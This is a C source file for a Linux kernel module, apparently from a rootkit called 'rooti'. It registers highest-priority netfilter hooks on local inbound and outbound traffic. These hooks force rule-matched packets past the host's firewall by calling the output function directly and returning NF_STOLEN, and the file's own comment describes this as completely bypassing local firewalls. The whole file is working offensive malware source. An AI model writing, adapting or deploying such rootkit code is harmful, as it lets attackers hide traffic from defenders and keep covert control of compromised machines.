#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/bug.h>
#include "fw_bypass.h"
#include "../utils.h"
#include "../config.h"

// Returns whether the given address is contained in the given subnet.
static inline bool rooti_subnet_contains(subnet_t *subnet, unsigned long addr)
{
    return (subnet->addr & subnet->mask) == (addr & subnet->mask);
}

// Returns whether the given IP header contains source & destination addresses that match the rule
static inline bool rooti_matching_addresses(struct iphdr *ip_header, struct rooti_net_rule *rule)
{
    return rooti_subnet_contains(&rule->saddr, ntohl(ip_header->saddr)) && 
           rooti_subnet_contains(&rule->daddr, ntohl(ip_header->daddr));
}

// Returns whether the given IP header contains a protocol tat matches the rule
static inline bool rooti_matching_protocol(struct iphdr *ip_header, struct rooti_net_rule *rule)
{
    return ip_header->protocol == rule->protocol;
}

// Returns whether the given TCP header contains source & destination ports that match the rule
static inline bool rooti_matching_tcp_ports(struct tcphdr *tcp_header, struct rooti_net_rule *rule)
{
    return (rule->sport == 0 || rule->sport == ntohs(tcp_header->source)) &&
           (rule->dport == 0 || rule->dport == ntohs(tcp_header->dest));
}

// Returns whether the given UDP header contains source & destination ports that match the rule
static inline bool rooti_matching_udp_ports(struct udphdr *udp_header, struct rooti_net_rule *rule)
{
    return (rule->sport == 0 || rule->sport == ntohs(udp_header->source)) &&
           (rule->dport == 0 || rule->dport == ntohs(udp_header->dest));
}

// Returns whether the given rule matches against the given packet
static bool rooti_matching_rule(struct sk_buff *skb, struct rooti_net_rule *rule)
{
    struct iphdr *ip_header = ip_hdr(skb);
    struct tcphdr *tcp_header;
    struct udphdr *udp_header;

    // Try to match network layer fields
    if (!rooti_matching_addresses(ip_header, rule)) return false;
    if (!rooti_matching_protocol(ip_header, rule)) return false;

    // Try to match transport layer fields (if relevant)
    switch(ip_header->protocol) {
    case IPPROTO_TCP:
        tcp_header = tcp_hdr(skb);
        if (!rooti_matching_tcp_ports(tcp_header, rule)) {
            return false;
        }
        break;
    case IPPROTO_UDP:
        udp_header = udp_hdr(skb);
        if (!rooti_matching_udp_ports(udp_header, rule)) {
            return false;
        }
        break;
    default:
        break;
    }
    return true;
}

static unsigned int rooti_netfilter_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct rooti_net_rule *rule;

    // We don't deal with non-IPv4 packets
    if (ntohs(skb->protocol) != ETH_P_IP) return NF_ACCEPT;
    
    // Iterate over the rulebase looking for a match
    for (int i = 0; i < ROOTI_NET_RULES_COUNT; i++) {
        rule = &ROOTI_NET_RULES[i];
        if (!rooti_matching_rule(skb, rule)) {
            continue;
        }
        if (rule->action == ROOTI_PACKET_DROP) return NF_DROP;
        if (rule->action == ROOTI_PACKET_ACCEPT) {
            // Forcefully send the packet out to the wire / to the user
            state->okfn(state->net, state->sk, skb);
            return NF_STOLEN;
        }
        BUG();
    }
    return NF_ACCEPT;
}

static struct nf_hook_ops rooti_inbound_nf_hook = {
    .hook = rooti_netfilter_hook,
    .hooknum = NF_INET_LOCAL_IN,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST
};

static struct nf_hook_ops rooti_outbound_nf_hook = {
    .hook = rooti_netfilter_hook,
    .hooknum = NF_INET_LOCAL_OUT,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST
};

// Registers netfilter hooks for completely bypassing local firewalls
int rooti_install_fw_bypass_hooks()
{
    int err;

    err = nf_register_net_hook(&init_net, &rooti_inbound_nf_hook);
    if (err) {
        ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
        return err;
    }
    err = nf_register_net_hook(&init_net, &rooti_outbound_nf_hook);
    if (err) {
        ROOTI_DEBUG("nf_register_net_hook() failed: %d", err);
        return err;
    }
    return 0;
}

// Unregisters netfilter hooks for firewall bypassing
void rooti_uninstall_fw_bypass_hooks()
{
    nf_unregister_net_hook(&init_net, &rooti_inbound_nf_hook);
    nf_unregister_net_hook(&init_net, &rooti_outbound_nf_hook);
}